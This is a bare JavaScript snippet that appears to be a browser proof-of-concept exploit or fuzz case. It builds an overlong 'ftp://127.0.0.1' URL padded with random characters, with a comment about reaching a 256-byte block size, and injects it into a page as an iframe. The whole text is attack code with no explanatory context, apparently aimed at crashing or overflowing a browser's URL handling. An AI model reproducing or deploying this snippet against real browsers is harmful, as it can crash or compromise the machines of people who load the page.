var text = "ftp://127.0.0.1:21/c:\\";
var possible = "POIUYTREWEWQSHGCBALKJCBNLAUJHFIQLAMXCBNZXMCHASJDHqweprouiqweytpouryxcj";
for (var i =0; i < 120; i++){//add 136 to get block size (256)
	text += possible.charAt(Math.floor(Math.random() * possible.length));
}
document.write("<iframe src="+text+" height='500' width='500'></iframe>");
